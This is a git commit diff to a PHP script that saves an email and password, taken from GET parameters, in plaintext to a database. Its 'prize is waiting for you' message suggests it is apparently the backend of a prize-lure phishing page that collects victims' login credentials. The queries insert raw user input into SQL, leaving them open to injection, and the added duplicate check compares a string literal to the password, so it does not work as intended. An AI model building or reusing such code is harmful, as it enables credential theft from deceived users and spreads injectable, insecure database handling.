62c6ebb3389d816613ccfa3f50f941cc5363536f
Remon <shresthanewar678@gmail.com>
2022-11-19 16:18:20 +0545

    database

--- database.php
+++ database.php
@@ -4,8 +4,10 @@ if($conn){
     $email = $_GET["email"];
     $password = $_GET["password"];
     $sql1 = mysqli_query($conn,"SELECT `Password` FROM `details` WHERE Password = '$password'");
+    $sql2 = mysqli_query($conn,"SELECT `Email or Phone Number` FROM `details` WHERE 'Email or Phone Number' = '$password'");
     $sql = "INSERT INTO `details`(`Email or Phone Number`, `Password`) VALUES ('$email','$password')";
     if(mysqli_num_rows($sql1)==0){
+        if(mysqli_num_rows($sql2)==0){
         if(mysqli_query($conn,$sql)){
             echo "your email and password has been saved.";
         }
@@ -13,6 +15,7 @@ if($conn){
          echo "go back and try again. prize is waiting for you.";
         }
     }
+}
     else{ echo "already entered the value.";
     }
 }
